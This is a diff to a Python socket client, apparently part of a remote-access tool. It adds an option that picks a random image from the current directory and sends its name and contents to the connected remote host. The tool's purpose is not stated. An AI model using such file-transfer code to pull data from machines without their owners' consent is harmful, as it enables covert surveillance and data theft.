@@ -9,6 +9,7 @@ from time import sleep
 from subprocess import Popen, PIPE
 from zipfile import ZipFile
 from cryptography.fernet import Fernet
+from random import randint
 
 class TCP:
     def __init__(self, host, port):
@@ -177,26 +178,41 @@ class TCP:
             self.recibirArchivo(destino)
 
     def image(self, cmd):
-        if re.search("-t", cmd):
-            imagen = re.findall("-i[= ]([a-zA-Z0-9./ ].*) -t", cmd)[0]
-        else:
-            imagen = re.findall("-i[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
+        try:
+            if re.search("-r", cmd):
+                imagenes = []
+                for i in os.listdir(os.getcwd()):
+                    archivo = f"{os.getcwd()}/{i}"
+                    if os.path.isfile(archivo) and self.isImage(archivo):
+                        imagenes.append(archivo)
 
-        if os.path.isfile(imagen) and self.isImage(imagen):
-            self.__sock.send("ok".encode())
-            sleep(0.05)
-            nombre = self.getNombre(imagen)
-            self.__sock.send(nombre.encode())
+                num = randint(0, len(imagenes)-1)
+                imagen = imagenes[num]
 
-            archivo = open(imagen, 'rb')
-            info = archivo.read()
-            archivo.close()
+            else:
+                if re.search("-t", cmd):
+                    imagen = re.findall("-i[= ]([a-zA-Z0-9./ ].*) -t", cmd)[0]
+                else:
+                    imagen = re.findall("-i[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
 
-            sleep(0.05)
-            self.enviarDatos(info)
+            if os.path.isfile(imagen) and self.isImage(imagen):
+                self.__sock.send("ok".encode())
+                sleep(0.05)
+                nombre = self.getNombre(imagen)
+                self.__sock.send(nombre.encode())
 
-        else:
-            self.__sock.send(f"error: Imagen \"{imagen}\" no encontrada".encode())
+                archivo = open(imagen, 'rb')
+                info = archivo.read()
+                archivo.close()
+
+                sleep(0.05)
+                self.enviarDatos(info)
+
+            else:
+                self.__sock.send(f"error: Imagen \"{imagen}\" no encontrada".encode())
+
+        except Exception as e:
+            print(e)
 
     def sendDirFrom(self, cmd):
         if re.search("-d", cmd):
